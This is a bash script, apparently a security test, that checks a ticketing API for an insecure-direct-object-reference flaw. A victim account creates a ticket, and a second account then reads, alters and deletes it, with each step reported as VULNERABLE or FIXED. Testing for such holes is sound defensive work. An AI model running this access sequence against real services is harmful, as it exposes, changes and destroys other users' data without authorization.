#!/bin/bash

# Source config from parent directory
source $(dirname "$0")/../config.sh

# TARGET_IP loaded from config.sh
SUFFIX=$RANDOM

VICTIM_EMAIL="IDOR.victim_${SUFFIX}@example.com"
ATTACKER_EMAIL="IDOR.attacker_${SUFFIX}@example.com"
PASSWORD="SecureP@ssword6732"

# =======================================================================================

echo "Registering users:"
curl -s -X POST "$TARGET_IP/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$VICTIM_EMAIL\", \"password\": \"$PASSWORD\"}" > /dev/null

curl -s -X POST "$TARGET_IP/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$ATTACKER_EMAIL\", \"password\": \"$PASSWORD\"}" > /dev/null

echo "Victim: $VICTIM_EMAIL"
echo "Attacker: $ATTACKER_EMAIL"

# =======================================================================================

echo -e "\nLogging in to get tokens:"
VICTIM_TOKEN=$(curl -s -X POST "$TARGET_IP/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$VICTIM_EMAIL\", \"password\": \"$PASSWORD\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token', ''))")

ATTACKER_TOKEN=$(curl -s -X POST "$TARGET_IP/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$ATTACKER_EMAIL\", \"password\": \"$PASSWORD\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token', ''))")

if [ -z "$VICTIM_TOKEN" ] || [ -z "$ATTACKER_TOKEN" ]; then
    echo "Failed to get tokens. Exiting."
    exit 1
fi
echo "Victim token: $VICTIM_TOKEN"
echo "Attacker token: $ATTACKER_TOKEN"

# =======================================================================================

echo -e "\n1. Victim creates a secret ticket"

# Save the raw JSON response
TICKET_JSON=$(curl -s -X POST "$TARGET_IP/tickets/" \
  -H "Authorization: Bearer $VICTIM_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
  "title": "Victim secret ticket",
  "description": "Victim eyes only",
  "severity": "HIGH"
}')

# print json response
echo "$TICKET_JSON" | jq .

# extract ticket id
TICKET_ID=$(echo "$TICKET_JSON" | python3 -c "import sys,json; print(json.load(sys.stdin).get('id'))")

echo "Extracted victim's ticket ID: $TICKET_ID"

if [ -z "$TICKET_ID" ] || [ "$TICKET_ID" == "null" ] || [ "$TICKET_ID" == "None" ]; then
    echo -e "Failed to create ticket. Exiting."
    exit 1
fi

# =======================================================================================

echo -e "\n2. Attacker READS the victim's ticket (IDOR on GET /{id})"
RESPONSE=$(curl -s -w "\n%{http_code}" -X GET "$TARGET_IP/tickets/$TICKET_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN")
BODY=$(echo "$RESPONSE" | head -n -1)
CODE=$(echo "$RESPONSE" | tail -n 1)
echo "$BODY" | jq .

if [ "$CODE" == "200" ]; then
    echo "[VULNERABLE] Attacker successfully read the ticket (HTTP 200)"
else
    echo "[FIXED] Attacker failed to read the ticket (HTTP $CODE)"
fi

# =======================================================================================

echo -e "\n3. Attacker UPDATES the victim's ticket (IDOR on PATCH /{id})"
RESPONSE=$(curl -s -w "\n%{http_code}" -X PATCH "$TARGET_IP/tickets/$TICKET_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
  "title": "Changed by attacker",
  "description": "Victim and attacker eyes only",
  "severity": "LOW"
}')
BODY=$(echo "$RESPONSE" | head -n -1)
CODE=$(echo "$RESPONSE" | tail -n 1)
echo "$BODY" | jq .

if [ "$CODE" == "200" ]; then
    echo "[VULNERABLE] Attacker successfully updated the ticket (HTTP 200)"
else
    echo "[FIXED] Attacker failed to update the ticket (HTTP $CODE)"
fi

# =======================================================================================

echo -e "\n4. Attacker DELETES the victim's ticketc (shown by HTTP 204) (IDOR on DELETE /{id})"
RESPONSE=$(curl -s -w "\n%{http_code}" -X DELETE "$TARGET_IP/tickets/$TICKET_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN")
CODE=$(echo "$RESPONSE" | tail -n 1)

if [ "$CODE" == "204" ]; then
    echo "[VULNERABLE] Attacker successfully deleted the ticket (HTTP 204)"
else
    echo "[FIXED] Attacker failed to delete the ticket (HTTP $CODE)"
fi

# =======================================================================================
